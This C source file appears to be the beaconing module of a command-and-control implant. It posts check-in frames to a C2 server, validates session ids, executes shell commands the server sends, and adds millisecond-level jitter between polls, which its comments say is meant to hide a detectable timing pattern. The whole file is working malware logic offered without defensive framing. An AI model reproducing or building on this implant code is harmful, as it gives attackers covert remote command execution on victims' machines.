#include "beacon.h"

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#include "frame.h"
#include "frame_post.h"
#include "protocol.h"
#include "tasks.h"

/* Mean milliseconds between check-ins, before jitter. */
#define POLL_BASE_MS 5000

/* How far each interval may deviate from the base, as a percentage. */
#define POLL_JITTER_PERCENT 40

int beacon_once(const struct target_config *target)
{
  char *body = NULL;
  size_t body_len = 0;
  int stop = 0;
  const int status = post_frame(target, C2_PATH_CHECKIN, CMD_CHECK_IN, NULL, 0,
                                &body, &body_len);

  if (status == 200 && body_len >= sizeof(struct C2_HEADER))
  {
    struct C2_HEADER incoming;

    /* frame_decode() rejects a frame if the server and implant disagree on the
       size of it; the id it carries is checked here, because only the implant
       knows which session it is. */
    if (!frame_decode(body, body_len, &incoming) ||
        incoming.session_id != target->session_id)
    {
      fprintf(stderr, "bad response\n");
    }
    else if (incoming.command_id == CMD_EXIT)
    {
      stop = 1;
    }
    else if (incoming.command_id == CMD_EXECUTE_SHELL)
    {
      task_execute(target, frame_payload(body), incoming.payload_size);
    }
  }
  else if (status != 204)
  {
    fprintf(stderr, "request failed (%d)\n", status);
  }

  free(body);
  return stop;
}

/* Jitter is in milliseconds: whole-second jitter still produced a visible 3s
   pattern, because every short draw rounded to the same value. */
void beacon_wait(void)
{
  const long span_ms = (POLL_BASE_MS * POLL_JITTER_PERCENT) / 100;
  long total_ms = POLL_BASE_MS - span_ms + (rand() % (int)((2 * span_ms) + 1));
  struct timespec interval;

  if (total_ms < 1)
  {
    total_ms = 1;
  }
  interval.tv_sec = (time_t)(total_ms / 1000);
  interval.tv_nsec = (long)(total_ms % 1000) * 1000000L;
  (void)nanosleep(&interval, NULL);
}
